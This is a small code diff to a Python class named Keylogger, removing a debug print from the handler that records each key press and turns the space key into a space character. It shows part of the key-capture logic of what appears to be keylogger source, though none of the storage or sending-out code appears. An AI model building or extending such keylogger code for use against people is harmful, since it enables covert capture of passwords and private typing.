@@ -17,7 +17,6 @@ class Keylogger:
     def process_key_press(self, key):
         try:
             current_key = (key.char)
-            print(type(current_key))
         except AttributeError:
             if key == key.space:
                 current_key = " "
